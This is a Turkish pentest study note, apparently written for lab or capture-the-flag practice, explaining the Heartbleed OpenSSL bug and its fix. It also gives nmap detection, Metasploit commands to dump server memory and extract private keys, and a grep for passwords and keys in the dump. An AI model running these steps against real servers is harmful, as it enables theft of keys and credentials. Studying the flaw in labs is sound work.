#security #ssl #tls #vulnerability #pentest

# Heartbleed (CVE-2014-0160)

## Arka Plan — SSL/TLS
- SSL/TLS, sunucu-istemci arasındaki iletişimi **şifreler**.
- Amaç: araya giren biri trafiği okuyamasın / değiştiremesin.
- Yaygın sürümler: **TLS 1.2**, **TLS 1.3**.

## Nedir?
- **OpenSSL** kütüphanesinde bulunan bir bug.
- Etkilenen sürümler: **1.0.1 → 1.0.1f**
- Saldırgana sunucunun **belleğine** (RAM) erişim sağlar.

### Sızabilecek veriler
- Sunucunun **private key**'i
- Kullanıcı adı / şifre gibi hassas bilgiler

## Bug Nasıl Oluşuyor? (Heartbeat mekanizması)
Heartbeat mesajı, bağlantıyı canlı tutmak için kullanılır (TLS handshake'i tekrar tekrar yapmak maliyetli olurdu).

Normal akış:
1. İstemci veri + verinin uzunluğunu gönderir
2. Sunucu bu veriyi pointer ile işaretler
3. Uzunluğu bir `payload` değişkenine kopyalar — **✅ burada uzunluk kontrol edilmiyor**
4. Sunucu `1 + 2 + payload + padding` (max: 65535 + padding) kadar bellek ayırır
5. `bp` pointer'ı ile bu belleğe veri kopyalanır
6. Sunucu veriyi geri gönderir

### Sorun
İstemci "65KB gönderiyorum" der ama gerçekte çok az veri gönderirse → sunucu, **belleğindeki rastgele/fazladan veriyi** de pakete katıp geri gönderir. Bu şekilde bellekte duran hassas bilgiler (parola, key parçaları) sızdırılabilir.

## Remediation (Çözüm)
Sunucu şunları kontrol etmeli:
- [ ] Heartbeat mesaj uzunluğu **0 olmamalı**
- [ ] Belirtilen uzunluk, **gerçek veri boyutunu aşmamalı**

---

## 🔧 Pratik: Nasıl Test Edilir?

### 1. Nmap ile tarama
```bash
nmap -p 443 --script ssl-heartbleed 10.114.94.180
```
Çıktıda `VULNERABLE` görürsen devam.

### 2. Metasploit ile sömürme (exploit)
```bash
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 10.114.94.180
set RPORT 443
set VERBOSE true
set ACTION DUMP
run
```
- `ACTION DUMP` → bellek dökümü alır
- `ACTION KEYS` → private key çekmeyi dener
- Sonuçlar: `~/.msf4/loot/`

### 3. Python PoC (Metasploit yoksa)
GitHub'da "heartbleed poc python" ile hazır scriptler bulunabilir.

### 4. Dump içinde arama
```bash
strings <dump_dosyası> | grep -i "password\|user\|flag\|BEGIN.*PRIVATE KEY"
```

---

## Notlar
- Sertifika süresi dolmuş (expired) hedefler genelde eski/donmuş lab makineleridir → bilerek eski OpenSSL çalıştırıyor olabilirler.
- Bu durumda gobuster gibi araçlar `-k` flag'i ile TLS doğrulamasını atlayarak çalıştırılabilir:
```bash
gobuster dir -k -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u https://10.114.94.180/
```

## Kaynaklar
- http://heartbleed.com/
- https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html
- https://stackabuse.com/heartbleed-bug-explained/
